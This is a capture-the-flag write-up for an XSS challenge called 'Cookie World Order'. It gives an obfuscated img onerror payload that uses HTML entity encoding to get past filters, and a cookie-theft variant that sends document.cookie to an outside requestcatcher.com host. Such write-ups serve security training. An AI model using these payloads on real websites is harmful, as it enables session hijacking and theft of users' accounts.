<span class="glitch__line glitch__line--first"></span>
<span class="glitch__line glitch__line--second"></span>
<h1 class="glitch glitch__color glitch__color--red">Cookie World Order</h1>
<h1 class="glitch glitch__color glitch__color--green">Cookie World Order</h1>
<h1 class="glitch glitch__color glitch__color--blue">Cookie World Order</h1>
<h1 class="glitch glitch__color">Cookie World Order</h1>
<br />
<br />

## Task
Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits. Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

[https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/)

## Solution
```<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">``` expands to ```<img src=x onerror="javascript:alert('XSS')">```
setting the payload to ```javascript:document.location='https://foobar123.requestcatcher.com?cookie='+document.cookie;``` gives us
> ```<img src=x onerror="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#102;&#111;&#111;&#98;&#97;&#114;&#49;&#50;&#51;&#46;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#99;&#97;&#116;&#99;&#104;&#101;&#114;&#46;&#99;&#111;&#109;&#63;&#99;&#111;&#111;&#107;&#105;&#101;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#59;">```

when submitted the [flag](../flags.html#51_cookieworldorder) is sent to ```https://foobar123.requestcatcher.com```